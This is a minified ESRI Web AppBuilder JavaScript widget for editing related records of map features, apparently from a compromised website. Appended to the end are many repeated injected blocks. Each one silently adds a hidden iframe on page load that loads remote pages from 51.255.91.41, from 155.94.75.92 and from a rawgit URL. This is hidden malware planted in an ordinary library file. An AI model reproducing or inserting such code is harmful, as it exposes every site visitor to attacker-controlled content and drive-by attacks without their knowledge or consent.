// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/Deferred dojo/query ./utils dijit/form/Button dijit/_TemplatedMixin dijit/_WidgetBase esri/undoManager esri/OperationBase esri/graphic esri/tasks/query esri/tasks/QueryTask esri/tasks/RelationshipQuery esri/layers/FeatureLayer esri/dijit/AttributeInspector esri/dijit/Popup esri/dijit/PopupTemplate jimu/SelectionManager jimu/ConfigManager jimu/dijit/DropdownMenu jimu/dijit/LoadingIndicator jimu/LayerInfos/LayerInfos".split(" "),
function(p,d,l,f,m,k,r,q,w,x,y,z,A,B,t,u,C,D,E,F,G,v,H,I,J,K){var h=p([y,x],{baseClass:"related-records-editor",templateString:"\x3cdiv\x3e\x3cdiv class\x3d'operation-box' data-dojo-attach-point\x3d'operationBox'\x3e\x3cdiv class\x3d'previos-btn feature-action' data-dojo-attach-point\x3d'previouBtn'data-dojo-attach-event\x3d'click:_onPreviouBtnClick'\x3e\x3c/div\x3e\x3cdiv class\x3d'operation-title' data-dojo-attach-point\x3d'operationTitle'\x3e\x3c/div\x3e\x3cdiv class\x3d'add-new-btn' data-dojo-attach-point\x3d'addNewBtn'\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d'content-box' data-dojo-attach-point\x3d'contentBox'\x3e\x3c/div\x3e\x3c/div\x3e",
editorATI:null,originalFeature:null,originalLayer:null,originalJimuLayerInfo:null,layerInfosObj:null,undoManager:null,refDomNode:null,_temporaryData:null,tableInfosParam:null,postCreate:function(){this._init();f.place(this.domNode,this.refDomNode,"after");window.isRTL?f.addClass(this.previouBtn,"icon-arrow-forward"):f.addClass(this.previouBtn,"icon-arrow-back");this.loading=(new J({hidden:!0})).placeAt(this.domNode);this._clearPage();this.showFirstPage({feature:this.originalFeature,oriJimuLayerInfo:this.originalJimuLayerInfo})},
_init:function(){this.refDomNode=this.editorATI.domNode;this.originalLayer=this.originalFeature.getLayer();this.layerInfosObj=K.getInstanceSync();this.originalJimuLayerInfo=this.layerInfosObj.getLayerOrTableInfoById(this.originalLayer.id);this.undoManager=new z;this._temporaryData={eventHandles:[],dijits:[]};this._tempPopup=new F({},f.create("div"));this._tempPopup.show()},destroy:function(){this._clearPage();this._tempPopup.destroy();this.inherited(arguments)},_getRelatedTableInfoArray:function(a){var b=
new k,c=[];a.getRelatedTableInfoArray("esriRelRoleOrigin").then(d.hitch(this,function(a){l.forEach(a,function(a){this._findTableInfoFromTableInfosParam(a)&&c.push(a)},this);b.resolve(c)}));return b},_getRelatedRecordsByQuery:function(a){var b=new k,c=new t,e=new u(a.destJimuLayerInfo.getUrl()),g=a.destJimuLayerInfo.layerObject.relationships.keyField,n=a.oriJimuLayerInfo.layerObject.objectIdField;c.where=g?g+" \x3d "+a.feature.attributes[g]:n+" \x3d "+a.feature.attributes[n];c.outFields=["*"];e.execute(c,
d.hitch(this,function(a){b.resolve(a)}));return b},_getRelatedRecordsByRelatedQuery:function(a){var b=new k,c=new C,e=this._getOriRelationshipByDestLayer(a);c.outFields=["*"];c.relationshipId=e.id;var g=a.feature.attributes[a.oriJimuLayerInfo.layerObject.objectIdField];c.objectIds=[g];a.oriJimuLayerInfo.layerObject.queryRelatedFeatures(c,d.hitch(this,function(a){(a=a[g]&&a[g].features)?b.resolve(a):b.resolve([])}),d.hitch(this,function(){b.resolve([])}));return b},_getOriRelationshipByDestLayer:function(a){var b=
null;l.some(a.oriJimuLayerInfo.layerObject.relationships,function(c){if(c.relatedTableId===a.destJimuLayerInfo.layerObject.layerId)return b=c,!0},this);return b},_getDestRelationshipByDestLayer:function(a){var b=null;l.some(a.destJimuLayerInfo.layerObject.relationships,function(c){if(c.relatedTableId===a.oriJimuLayerInfo.layerObject.layerId)return b=c,!0},this);return b},_createATI:function(a){var b,c=null;if(b=this._findTableInfoFromTableInfosParam(a.destJimuLayerInfo))c=new h.ATI({layerInfos:[b],
hideNavButtons:!0},f.create("div")),c.startup(),this._temporaryData.dijits.push(c);this._editWidget._configEditor.usingSaveButton&&(b=c.addButton(this.nls.save,"save-button related-record disable","after"),b=m(b,"click",d.hitch(this,this._onSaveBtnClick,a,c)),this._temporaryData.eventHandles.push(b));b=c.addButton(this.nls.close,"close-button related-record","before");b=m(b,"click",d.hitch(this,this._onCloseBtnClick));this._temporaryData.eventHandles.push(b);b=m(c,"delete",d.hitch(this,this._onDeleteBtnClick,
a));this._temporaryData.eventHandles.push(b);b=m(c,"attribute-change",d.hitch(this,this._onAttributeChange,a));this._temporaryData.eventHandles.push(b);return c},_findTableInfoFromTableInfosParam:function(a){var b=null;l.some(this.tableInfosParam,function(c){if(c.featureLayer.id===a.id)return b=c,!0},this);return b},_prepareNewRelatedRecord:function(a){var b=this._getTemplateFromLayerObject(a.destJimuLayerInfo.layerObject),b=d.mixin({},b?b.prototype.attributes:{}),c=this._getOriRelationshipByDestLayer(a),
e=this._getDestRelationshipByDestLayer(a);c.keyField&&e&&e.keyField?(c=q.ignoreCaseToGetFieldKey(a.oriJimuLayerInfo.layerObject,c.keyField),e=q.ignoreCaseToGetFieldKey(a.destJimuLayerInfo.layerObject,e.keyField),c&&e&&(b[e]=a.feature.attributes[c])):c.keyField&&(c=q.ignoreCaseToGetFieldKey(a.oriJimuLayerInfo.layerObject,c.keyField))&&(b[c]=a.feature.attributes[c]);return new B(null,null,b,null)},_addNewRelatedRecord:function(a,b){var c=new k,e=b.destJimuLayerInfo.layerObject;e.applyEdits([a],null,
null,d.hitch(this,function(b){var g=b[0];if(g.success&&g.objectId){b=new t;var f=new u(e.url);b.where=e.objectIdField+" \x3d "+g.objectId;b.outFields=["*"];f.execute(b,d.hitch(this,function(b){(b=b.features[0])?c.resolve(b):(a.attributes[e.objectIdField]=g.objectId,c.resolve(a))}),d.hitch(this,function(){c.reject()}))}else c.reject()}),d.hitch(this,function(){c.reject()}));return c},_deleteRelatedRecord:function(a){var b=new k;a.destJimuLayerInfo.layerObject.applyEdits(null,null,[a.relatedFeature],
d.hitch(this,function(){b.resolve()}),d.hitch(this,function(){b.reject()}));return b},_updateRelatedRecordOnSave:function(a){this.loading.show();this._updateRelatedRecord(a).then(d.hitch(this,function(){this.loading.hide()}),d.hitch(this,function(){this.loading.hide()}))},_updateRelatedRecordOnClient:function(a,b){this._editWidget._startEditingSession();a.relatedFeature.attributes[b.fieldName]=b.fieldValue;(b=b.target)&&b.updateCurrentSelectdFeature&&b.updateCurrentSelectdFeature([a.relatedFeature],
a.destJimuLayerInfo.layerObject)},_updateRelatedRecordDirectly:function(a,b){this.loading.show();a.relatedFeature.attributes[b.fieldName]=b.fieldValue;this._updateRelatedRecord(a).then(d.hitch(this,function(){this.loading.hide();var c=b.target;c&&c.updateCurrentSelectdFeature&&c.updateCurrentSelectdFeature([a.relatedFeature],a.destJimuLayerInfo.layerObject)}),d.hitch(this,function(){this.loading.hide()}))},_updateRelatedRecord:function(a){var b=new k;a.destJimuLayerInfo.layerObject.applyEdits(null,
[a.relatedFeature],null,d.hitch(this,function(){b.resolve()}),d.hitch(this,function(){b.reject()}));return b},_getDisplayTitleOfRelatedRecord:function(a,b,c){var d=a.getInfoTemplate();return(a="popupTitle"===c&&d?"function"===typeof d.title?d.title(b):d.title:this._getDisplayTitleFromPopup(a,b,c))?a:""},_getDisplayTitleFromPopup:function(a,b,c){(a=this._getPopupTemplateWithOnlyDisplayField(a,c))?(b.setInfoTemplate(a),this._tempPopup.setFeatures([b]),c=(c=r("td.attrValue",this._tempPopup.domNode)[0])&&
c.innerHTML,b.setInfoTemplate(null)):c=q.getAttrByFieldKey(b,c);return c},_getPopupTemplateWithOnlyDisplayField:function(a,b){a=a._getCustomPopupInfo(a.layerObject,[b]);return new G(a)},_getTemplateFromLayerObject:function(a){var b=null;a.templates&&a.templates[0]?b=a.templates[0]:a.types&&a.types[0]&&a.types[0].templates[0]&&(b=a.types[0].templates[0]);return b},showRelatedRecords:function(a){this._changeRefDomNode();var b=d.getObject("_wabProperties.originalLayerName",!1,a.destJimuLayerInfo.layerObject)||
a.destJimuLayerInfo.title;this._setOperationTitle(b);this._clearPage();this.loading.show();this._getRelatedRecordsByRelatedQuery(a).then(d.hitch(this,function(b){this._showAddNewBtn(a);0<b.length?this._setTitle(window.jimuNls.popup.relatedRecords):this._setTitle(window.jimuNls.popup.noRelatedRecotds,"font-normal");var c=this._showFieldSelector(a.destJimuLayerInfo);l.forEach(b,function(b,e){b._layer=a.destJimuLayerInfo.layerObject;var g=this._getDisplayTitleOfRelatedRecord(a.destJimuLayerInfo,b,c);
e=f.create("div",{"class":"item record-item "+(0===e%2?"oddLine":"evenLine"),innerHTML:g},this.contentBox);e.relatedRecord=b;e=m(e,"click",d.hitch(this,function(){this._addOperation(h.OPERATION_SHOW_RELATED_RECORDS,a);this.showInspector(this._createOperationData(a.feature,a.oriJimuLayerInfo,a.destJimuLayerInfo,b))}));this._temporaryData.eventHandles.push(e)},this);this.loading.hide()}))},showInspector:function(a){var b=!1;this._changeRefDomNode();var c=a.destJimuLayerInfo.layerObject,e=d.getObject("_wabProperties.originalLayerName",
!1,c)||a.destJimuLayerInfo.title,c=d.getObject("_wabProperties.popupInfo.displayFieldOfRelatedRecordList",!1,c),g=this._getDisplayTitleOfRelatedRecord(a.destJimuLayerInfo,a.relatedFeature,c);"popupTitle"!==c&&(g=e+": "+g);this._setOperationTitle(g);this._clearPage();(g=this._createATI(a))&&f.place(g.domNode,this.contentBox);e=a.destJimuLayerInfo.layerObject.objectIdField;c=a.relatedFeature.attributes[e];null===c||void 0===c?(g.showFeature(a.relatedFeature,a.destJimuLayerInfo.layerObject),b=!0,r(".atiButton.atiDeleteButton",
g.domNode).addClass("disable"),this._editWidget._startEditingSession()):(this.loading.show(),g=new t,g.where=e+" \x3d "+c,a.destJimuLayerInfo.layerObject.selectFeatures(g,D.SELECTION_NEW,d.hitch(this,function(){this.loading.hide();var b=a.destJimuLayerInfo.layerObject.getSelectedFeatures();b&&b[0]&&b[0].geometry&&this._activeGraphicEdit(b[0],a.oriJimuLayerInfo)})));this.showRelatedTables(this._createOperationData(a.relatedFeature,a.destJimuLayerInfo,null,null),a,b)},showRelatedTables:function(a,b,
c){this._getRelatedTableInfoArray(a.oriJimuLayerInfo).then(d.hitch(this,function(e){0<e.length&&this._setTitle(window.jimuNls.popup.relatedTables);l.forEach(e,function(e,n){n=f.create("div",{"class":"item table-item "+(0===n%2?"oddLine ":"evenLine ")+(c?"disable ":"enable "),innerHTML:e.title},this.contentBox);c||(n=m(n,"click",d.hitch(this,function(){var c;this._editWidget._configEditor.usingSaveButton?c=this._editWidget._popupConfirmDialog():(c=new k,c.resolve(!0));c.then(d.hitch(this,function(c){c&&
e.getLayerObject().then(d.hitch(this,function(){b?this._addOperation(h.OPERATION_SHOW_INSPECTOR,b):this._addOperation(h.OPERATION_FIRST,a);this.showRelatedRecords(this._createOperationData(a.feature,a.oriJimuLayerInfo,e,null))}))}))})),this._temporaryData.eventHandles.push(n))},this)}))},showFirstPage:function(a,b){this._clearPage();this._revertRefDomNode();this.showRelatedTables(a);b&&(l.forEach(this._editWidget._jimuLayerInfos.getLayerInfoArray(),function(a){a.layerObject&&a.layerObject.clearSelection&&
a.id!==this.originalJimuLayerInfo.id&&v.getInstance().clearSelection(a.layerObject)},this),this.originalFeature.setSymbol(this.originalLayer.getSelectionSymbol()),this._activeGraphicEdit(this.originalFeature))},_activeGraphicEdit:function(a,b){b&&(b.id===this.originalJimuLayerInfo.id?this.originalFeature.setSymbol(null,!0):v.getInstance().clearSelection(b.layerObject));var c;this._editWidget.editor._editVertices=!0;this._editWidget.editor._activateEditToolbar(a);a.geometry&&(c="point"===a.geometry.type?
a.geometry:a.geometry.getExtent().getCenter());this._editWidget.map.infoWindow.show(c)},_createOperationData:function(a,b,c,d){return{feature:a,oriJimuLayerInfo:b,destJimuLayerInfo:c,relatedFeature:d}},_addOperation:function(a,b){this.undoManager.add(new h.Operation(a,b,this))},_onPreviouBtnClick:function(){var a;this._editWidget._configEditor.usingSaveButton?a=this._editWidget._popupConfirmDialog():(a=new k,a.resolve(!0));a.then(d.hitch(this,function(a){a&&this.undoManager.undo()}))},_onAddNewBtnClick:function(a){var b=
this._prepareNewRelatedRecord(a);this._editWidget._configEditor.usingSaveButton?(this._addOperation(h.OPERATION_SHOW_RELATED_RECORDS,a),this.showInspector(this._createOperationData(a.feature,a.oriJimuLayerInfo,a.destJimuLayerInfo,b))):(this.loading.show(),this._addNewRelatedRecord(b,a).then(d.hitch(this,function(b){this.loading.hide();this._addOperation(h.OPERATION_SHOW_RELATED_RECORDS,a);this.showInspector(this._createOperationData(a.feature,a.oriJimuLayerInfo,a.destJimuLayerInfo,b))}),d.hitch(this,
function(){this.loading.hide()})))},_onCloseBtnClick:function(){this._editWidget.editPopup.hide()},_onDeleteBtnClick:function(a){var b=a.relatedFeature.attributes[a.destJimuLayerInfo.layerObject.objectIdField];null!==b&&void 0!==b&&(this._editWidget._configEditor.usingSaveButton&&this._editWidget._stopEditingSession(),this.loading.show(),this._deleteRelatedRecord(a).then(d.hitch(this,function(){this.loading.hide();this._onPreviouBtnClick()}),d.hitch(this,function(){this.loading.hide()})))},_onSaveBtnClick:function(a){if(this._editWidget._isEditingSession){var b=
a.relatedFeature.attributes[a.destJimuLayerInfo.layerObject.objectIdField];null===b||void 0===b?(b=a.relatedFeature,this.loading.show(),this._addNewRelatedRecord(b,a).then(d.hitch(this,function(b){this.loading.hide();this.showInspector(this._createOperationData(a.feature,a.oriJimuLayerInfo,a.destJimuLayerInfo,b))}),d.hitch(this,function(){this.loading.hide()}))):this._updateRelatedRecordOnSave(a);this._editWidget._stopEditingSession()}},_onAttributeChange:function(a,b){this._editWidget._configEditor.usingSaveButton?
this._updateRelatedRecordOnClient(a,b):this._updateRelatedRecordDirectly(a,b)},_clearPage:function(){f.empty(this.contentBox);f.setStyle(this.addNewBtn,"display","none");l.forEach(this._temporaryData.eventHandles,function(a){a&&a.remove&&a.remove()},this);this._temporaryData.eventHandles=[];l.forEach(this._temporaryData.dijits,function(a){a&&a.destroy&&a.destroy()},this);this._temporaryData.dijits=[]},_changeRefDomNode:function(){f.setStyle(this.refDomNode,"display","none");f.setStyle(this.operationBox,
"display","block");f.addClass(this.domNode,"fix-height-mode");this.previouBtn.title=window.jimuNls.common.back;this.addNewBtn.title=window.jimuNls.common.newText;this.undoManager.peekUndo()?f.setStyle(this.previouBtn,"display","block"):f.setStyle(this.previouBtn,"display","none")},_revertRefDomNode:function(){f.setStyle(this.refDomNode,"display","block");f.setStyle(this.operationBox,"display","none");f.removeClass(this.domNode,"fix-height-mode")},_showAddNewBtn:function(a){var b=a.destJimuLayerInfo.layerObject;
"Table"===b.type&&b.getEditCapabilities&&b.getEditCapabilities().canCreate&&(f.setStyle(this.addNewBtn,"display","block"),a=m(this.addNewBtn,"click",d.hitch(this,this._onAddNewBtnClick,a)),this._temporaryData.eventHandles.push(a))},_setTitle:function(a,b){a&&f.create("div",{"class":"title-box "+(b?b:""),innerHTML:a},this.contentBox)},_setOperationTitle:function(a){f.setAttr(this.operationTitle,"innerHTML",a);f.setAttr(this.operationTitle,"title",a)},_showFieldSelector:function(a){var b="objecid",
c=r(".title-box",this.contentBox)[0],e=a.layerObject,g=[];if(!c||!a)return b;var f=a.getPopupInfo();f&&f.title&&g.push({label:window.jimuNls.popup.saveAsPopupTitle,value:"popupTitle"});l.forEach(e.fields,function(a){"globalid"!==a.name.toLowerCase()&&"shape"!==a.name.toLowerCase()&&g.push({label:a.alias||a.name,value:a.name})});c=(new I({items:g})).placeAt(c);c.domNode.title=window.jimuNls.popup.chooseFieldTip;var h=d.getObject("_wabProperties.popupInfo.displayFieldOfRelatedRecordList",!1,e),k=q.ignoreCaseToGetFieldObject(a.layerObject,
a.layerObject.displayField||a.layerObject.objectIdField),p=H.getInstance().getAppConfig();h?b=h:"2.3"===p.configWabVersion&&k&&k.name?b=k.name:f&&f.title?b="popupTitle":k&&k.name?b=k.name:0<g.length&&(b=g[0].value);b&&(c.setHighlightValue(b),d.setObject("_wabProperties.popupInfo.displayFieldOfRelatedRecordList",b,e));this._temporaryData.dijits.push(c);a=m(c,"click-item",d.hitch(this,function(a,b){r(".item.record-item",this.contentBox).forEach(d.hitch(this,function(c){d.setObject("_wabProperties.popupInfo.displayFieldOfRelatedRecordList",
b,e);var f=this._getDisplayTitleOfRelatedRecord(a,c.relatedRecord,b);c.innerHTML=f}))},a));this._temporaryData.eventHandles.push(a);return b}});h.Operation=p([A],{constructor:function(a,b,c){this.operationName=a;this.operationData=b;this.relatedRecordsEditor=c},performUndo:function(){switch(this.operationName){case h.OPERATION_SHOW_RELATED_TABLES:return this.relatedRecordsEditor.showRelatedTables(this.operationData);case h.OPERATION_SHOW_RELATED_RECORDS:return this.relatedRecordsEditor.showRelatedRecords(this.operationData);
case h.OPERATION_SHOW_INSPECTOR:return this.relatedRecordsEditor.showInspector(this.operationData);default:return this.relatedRecordsEditor.showFirstPage(this.operationData,!0)}}});h.ATI=p([E],{constructor:function(){this._aiConnects=[];this._selection=[];this._toolTips=[]},addButton:function(a,b,c){c=c?c:"before";a=new w({label:a,"class":" atiButton "+b},f.create("div"));f.place(a.domNode,this.deleteBtn.domNode,c);return a},updateCurrentSelectdFeature:function(a,b){b.ownershipBasedAccessControlForFeatures=
!0;this._updateSelection(a,b);b.ownershipBasedAccessControlForFeatures=!1}});d.mixin(h,{OPERATION_SHOW_RELATED_TABLES:"showRelatedTables",OPERATION_SHOW_RELATED_RECORDS:"showRelatedRecords",OPERATION_SHOW_INSPECTOR:"showInspector",OPERATION_FIRST:"first"});return h});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});